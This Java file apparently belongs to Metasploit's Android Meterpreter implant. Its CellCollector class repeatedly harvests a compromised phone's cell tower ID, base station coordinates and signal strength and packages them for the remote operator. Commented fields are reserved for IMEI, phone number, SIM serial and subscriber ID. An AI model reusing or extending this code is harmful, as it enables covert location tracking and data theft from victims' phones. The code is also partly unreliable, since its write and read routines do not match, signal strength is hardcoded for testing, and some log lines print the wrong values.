package com.metasploit.meterpreter;

import android.os.Bundle;
import android.telephony.CellLocation;
import android.telephony.NeighboringCellInfo;
import android.telephony.PhoneStateListener;
import android.telephony.ServiceState;
import android.telephony.TelephonyManager;
import android.telephony.cdma.CdmaCellLocation;
import android.telephony.gsm.GsmCellLocation;
import android.telephony.CellInfoGsm;
import android.telephony.CellInfoCdma;
import android.telephony.CellSignalStrengthGsm;
import android.telephony.CellSignalStrengthCdma;
import android.telephony.CellSignalStrength;

import android.telephony.CellSignalStrengthCdma;
import android.telephony.CellSignalStrengthLte;
import android.telephony.CellSignalStrengthWcdma;
import android.telephony.CellSignalStrength;
import android.util.Log;

import android.content.Context;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Hashtable;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;

import java.lang.InterruptedException;
import java.lang.Math;

import com.metasploit.meterpreter.android.interval_collect;
//Logging
import android.util.Log;

public class CellCollector extends IntervalCollector {
    public static final String Tag = CellCollector.class.getSimpleName();
    public final static int INVALID_LAT_LONG = Integer.MAX_VALUE;
    private final Object syncObject = new Object();
    private Hashtable<Long, TelephonyModel> collections = null;
    TelephonyModel mTelePhonybj = new TelephonyModel();
    
    public CellCollector(int collectorId, Context context, long timeout) {
        super(collectorId, context, timeout);
        this.collections = new Hashtable<Long, TelephonyModel>();
    }
    
    public CellCollector(int collectorId, Context context) {
        super(collectorId, context);
        this.collections = new Hashtable<Long, TelephonyModel>();
    }
    
    protected void init() {
    }
    
    protected void deinit() {
    }
    
    protected boolean collect(DataOutputStream output) throws IOException {
        TelephonyModel lTelePhonybj = new TelephonyModel();
        lTelePhonybj.setmUnixEpoch();
        getTelephonyInfo(lTelePhonybj);
        
        if (lTelePhonybj != null) {
            
            synchronized (this.syncObject) {
                this.collections.put(System.currentTimeMillis(), lTelePhonybj);
                Log.d(Tag,"The Timeout in collect :"+this.timeout);
                
                // collect requires the result to be the serialised version of
                // the collection data so that it can be written to disk
                output.writeLong(this.timeout);
                Log.d(Tag,"The Collections size in collect :"+this.collections.size());
                output.writeInt(this.collections.size());
                for (Long ts : this.collections.keySet()) {
                    TelephonyModel lObj;
                    lObj = this.collections.get(ts.longValue());
                    Log.d(Tag,"The Long Value in collect:"+ts.longValue());
                    output.writeLong(ts.longValue());
                    lObj.write(output);
                }
            }
            return true;
        }
        return false;
    }
    
    protected void loadFromMemory(DataInputStream input) throws IOException {
        this.timeout = input.readLong();
        Log.d(Tag,"The timeout in loadFromMemory"+this.timeout);
        int collectionCount = input.readInt();
        Log.d(Tag,"The collection count in loadFromMemory"+collectionCount);
        for (int i = 0; i < collectionCount; ++i) {
            long ts = input.readLong();
            int resultCount = input.readInt();
            
            for (int j = 0; j < resultCount; ++j) {
                
                TelephonyModel lTelephonyModObj  = new   TelephonyModel();
                lTelephonyModObj.mUnixEpoch = input.readLong();
                Log.d(Tag,"The Unix Epoch in loadFromMemory : "+lTelephonyModObj.mUnixEpoch);
                lTelephonyModObj.mCellTowerId= input.readUTF();
                Log.d(Tag,"The Cell Tower ID in loadFromMemory : "+lTelephonyModObj.mCellTowerId);
                lTelephonyModObj.mSignalStrength= input.readUTF();
                Log.d(Tag,"The Signal Strength in loadFromMemory :"+lTelephonyModObj.mSignalStrength);
                
                /* for future usage now it is commented*/
                // lTelephonyModObj.mDeviceid = input.readUTF();
                // lTelephonyModObj.mPhonenumber = input.readUTF();
                // lTelephonyModObj.mSoftwareversion = input.readUTF();
                // lTelephonyModObj.mNetWorkOperatorName = input.readUTF();
                // lTelephonyModObj.mSimCountryCode = input.readUTF();
                // lTelephonyModObj.mNetWorkOperator = input.readUTF();
                // lTelephonyModObj.mSimSerialNumber = input.readUTF();
                // lTelephonyModObj.mSubscriberId = input.readUTF();
                // lTelephonyModObj.mNetWorkType = input.readUTF();
                // lTelephonyModObj.mPhoneType = input.readUTF();
                
                // lTelephonyModObj.mGSMCellInfo.mCid = input.readInt();
                // lTelephonyModObj.mGSMCellInfo.mLac = input.readInt();
                // lTelephonyModObj.mGSMCellInfo.mPsc = input.readInt();
                
                // lTelephonyModObj.mCDMACellInfo.mBaseStationId  = input.readInt();
                // lTelephonyModObj.mCDMACellInfo.mBaseStationLatitude  = input.readInt();
                // lTelephonyModObj.mCDMACellInfo.mBaseStationLongitude  = input.readInt();
                // lTelephonyModObj.mCDMACellInfo.mSystemId  = input.readInt();
                // lTelephonyModObj.mCDMACellInfo.mNetworkId  = input.readInt();
                
                this.collections.put(ts, lTelephonyModObj);
            }
        }
    }
    
    public boolean flush(TLVPacket packet) {
        Hashtable<Long, TelephonyModel> collections = this.collections;
        
        synchronized (this.syncObject) {
            // create a new collection, for use on the other thread
            // if it's running
            this.collections = new Hashtable<Long, TelephonyModel>();
        }
        
        List<Long> sortedKeys = new ArrayList<Long>(collections.keySet());
        Collections.sort(sortedKeys);
        
        for (Long ts : sortedKeys) {
            long timestamp = ts.longValue();
            TelephonyModel telePhonyscanResults = collections.get(timestamp);
            TLVPacket resultSet = new TLVPacket();
            
            try {
                resultSet.add(interval_collect.TLV_TYPE_COLLECT_RESULT_TIMESTAMP, timestamp / 1000);
            }
            catch (IOException ex) {
                Log.d(Tag, Log.getStackTraceString(ex.getCause().getCause()));
            }
            
            TelephonyModel result = telePhonyscanResults;
            TLVPacket telePhonySet = new TLVPacket();
            try {
                Log.d(Tag," In Try block of TLV packet flushing");
                telePhonySet.add(interval_collect.TLV_TYPE_CELL_TOWERID, result.mCellTowerId);
                Log.d(Tag,"The Cell Tower id from Flush : "+result.mCellTowerId);
                telePhonySet.add(interval_collect.TLV_TYPE_CELL_SINGALSTRENGTH, result.mSignalStrength);
                Log.d(Tag,"The Cell Signal Strength  from Flush : "+result.mSignalStrength);
                resultSet.addOverflow(interval_collect.TLV_TYPE_COLLECT_RESULT_WIFI, telePhonySet);
            }
            catch (IOException ex) {
                Log.d(Tag, Log.getStackTraceString(ex.getCause().getCause()));
            }
            
            try {
                packet.addOverflow(interval_collect.TLV_TYPE_COLLECT_RESULT_GROUP, resultSet);
            }
            catch (IOException ex) {
                Log.d(Tag, Log.getStackTraceString(ex.getCause().getCause()));
            }
        }
        
        return true;
    }
    
    /* future use*/
    private String getNetworkTypeString(int type) {
        String typeString = "Unknown";
        switch (type) {
            case TelephonyManager.NETWORK_TYPE_EDGE:
            typeString = "EDGE";
            break;
            case TelephonyManager.NETWORK_TYPE_GPRS:
            typeString = "GPRS";
            break;
            case TelephonyManager.NETWORK_TYPE_UMTS:
            typeString = "UMTS";
            break;
            default:
            typeString = "UNKNOWN";
            break;
        }
        
        return typeString;
    }
    
    /* future use*/
    private String getPhoneTypeString(int type) {
        
        String typeString = "Unknown";
        
        switch (type) {
            
            case TelephonyManager.PHONE_TYPE_GSM:
            typeString = "GSM";
            break;
            case TelephonyManager.PHONE_TYPE_NONE:
            typeString = "UNKNOWN";
            break;
            default:
            typeString = "UNKNOWN";
            break;
        }
        return typeString;
    }
    
    
    public void getTelephonyInfo(TelephonyModel aTelephonyObj) {
        
        TelephonyManager lTelePhonyManager = (TelephonyManager) AndroidMeterpreter.getContext()
        .getSystemService(Context.TELEPHONY_SERVICE);
        
        //CellInfoGsm cellInfoGsm = (CellInfoGsm)lTelePhonyManager.getAllCellInfo().get(0);
        
        List<CellInfoGsm> lGsmCellInfo;
        List<CellInfoCdma> lCDMACellInfo;
        
        GsmCellLocation gsmloc;
        CdmaCellLocation cdmaloc;
        
        
        if (lTelePhonyManager.getPhoneType() == TelephonyManager.PHONE_TYPE_CDMA) {
            cdmaloc = (CdmaCellLocation) lTelePhonyManager.getCellLocation();
            lCDMACellInfo = (List<CellInfoCdma>) (Object) lTelePhonyManager.getAllCellInfo();
            aTelephonyObj.mCDMACellInfo.mBaseStationId = cdmaloc.getBaseStationId();
            Log.d(Tag,"The Base Station ID in getTelephonyInfo() - "+aTelephonyObj.mCDMACellInfo.mBaseStationId);
            aTelephonyObj.mCDMACellInfo.mBaseStationLatitude = cdmaloc.getBaseStationLatitude();
            Log.d(Tag,"The Base Station Latitude in getTelephonyInfo() - "+aTelephonyObj.mCDMACellInfo.mBaseStationId);
            aTelephonyObj.mCDMACellInfo.mBaseStationLongitude = cdmaloc.getBaseStationLongitude();
            Log.d(Tag,"The Base Station Longitude in getTelephonyInfo() - "+aTelephonyObj.mCDMACellInfo.mBaseStationId);
            aTelephonyObj.mCDMACellInfo.mSystemId = cdmaloc.getSystemId();
            Log.d(Tag,"The System ID in getTelephonyInfo() - "+aTelephonyObj.mCDMACellInfo.mSystemId);
            aTelephonyObj.mCDMACellInfo.mNetworkId = cdmaloc.getNetworkId();
            Log.d(Tag,"The Network ID in getTelephonyInfo() - "+aTelephonyObj.mCDMACellInfo.mNetworkId);
            CellSignalStrengthCdma lObj1 = (CellSignalStrengthCdma) lCDMACellInfo.get(0).getCellSignalStrength();
            aTelephonyObj.mCellTowerId= String.valueOf( aTelephonyObj.mCDMACellInfo.mBaseStationId);
	  aTelephonyObj.mSignalStrength = String.valueOf(lObj1.getDbm());
            Log.d(Tag,"The Signal Strength in getTelephonyInfo() - "+aTelephonyObj.mSignalStrength);
            
            
        } else if(lTelePhonyManager.getPhoneType() == TelephonyManager.PHONE_TYPE_GSM) {
            
            
            gsmloc = (GsmCellLocation) lTelePhonyManager.getCellLocation();
            lGsmCellInfo = (List<CellInfoGsm>)(Object)lTelePhonyManager.getAllCellInfo();
            aTelephonyObj.mGSMCellInfo.mCid = gsmloc.getCid();
            aTelephonyObj.mGSMCellInfo.mLac = gsmloc.getLac();
            aTelephonyObj.mCellTowerId = String.valueOf(aTelephonyObj.mGSMCellInfo.mCid);
            
            /*observed issue with cellInfoWcdma to CellinfoGsm type conversion*/
            
            //CellSignalStrength lObj2 = (CellSignalStrength)lGsmCellInfo.get(0).getCellSignalStrength(); //Need fix here
            //aTelephonyObj.mSignalStrength 	= String.valueOf(lObj2.getDbm()); //Need fix here
            
            aTelephonyObj.mSignalStrength = "10db"; //only for test, hardcoding.
        }
    }
    
    
    // Telephony Model
    private class TelephonyModel  {
        
        public long mUnixEpoch;
        public String mCellTowerId;
        public String mSignalStrength;
        public String mIMEINumber;
        public String mNetWorkOperator;
        public String mNetWorkOperatorName;
        public String mNetWorkType;
        public String mDeviceid ;
        public String mPhonenumber ;
        public String mSoftwareversion ;
        public String mSimCountryCode ;
        public String mSimSerialNumber ;
        public String mSubscriberId ;
        public String mPhoneType ;
        
        
        public GSMCellInfo mGSMCellInfo  = new GSMCellInfo();
        public CDMACellInfo mCDMACellInfo = new CDMACellInfo();
        
        public void setmUnixEpoch(){
            mUnixEpoch =  System.currentTimeMillis();
            Log.d(Tag,"The Unix Epoch in TelephonyModel - "+mUnixEpoch);
        }
        
        
        public void write(DataOutputStream output) throws IOException {
            
            
            output.writeLong(this.mUnixEpoch);
            Log.d(Tag,"The Unix Epoch from Write function: "+this.mUnixEpoch);
            output.writeChars(this.mCellTowerId);
            Log.d(Tag,"The Cell tower id  from Write function: "+this.mCellTowerId);
            output.writeChars(this.mSignalStrength);
            Log.d(Tag,"The SignalStrength from write function  "+this.mSignalStrength);
            
            /* parameters can be used in future*/
            //       output.writeChars(this.mIMEINumber);
            //       output.writeChars(this.mNetWorkOperator);
            //       output.writeChars(this.mNetWorkOperatorName);
            //       output.writeChars(this.mNetWorkType);
            //       output.writeChars(this.mDeviceid);
            //       output.writeChars(this.mPhonenumber);
            //       output.writeChars(this.mSoftwareversion);
            //       output.writeChars(this.mSimCountryCode);
            //       output.writeChars(this.mSimSerialNumber);
            //       output.writeChars(this.mSubscriberId);
            //       output.writeChars(this.mPhoneType);
            
            // output.writeInt(this.mGSMCellInfo.mLac);
            // output.writeInt(this.mGSMCellInfo.mCid);
            // output.writeInt(this.mGSMCellInfo.mPsc);
            
            // output.writeInt(this.mCDMACellInfo.mBaseStationId);
            // output.writeInt(this.mCDMACellInfo.mBaseStationLatitude);
            // output.writeInt(this.mCDMACellInfo.mBaseStationLongitude);
            // output.writeInt(this.mCDMACellInfo.mSystemId);
            // output.writeInt(this.mCDMACellInfo.mNetworkId);
            
        }
        
    }
    
    private class GSMCellInfo {
        public int mLac  = -1;
        public int mCid  = -1;
        public int mPsc  = -1;
        
    }
    
    private class CDMACellInfo {
        public int mBaseStationId = -1;
        public int mBaseStationLatitude = INVALID_LAT_LONG;
        public int mBaseStationLongitude = INVALID_LAT_LONG;
        public int mSystemId = -1;
        public int mNetworkId = -1;
        
    }
    
}

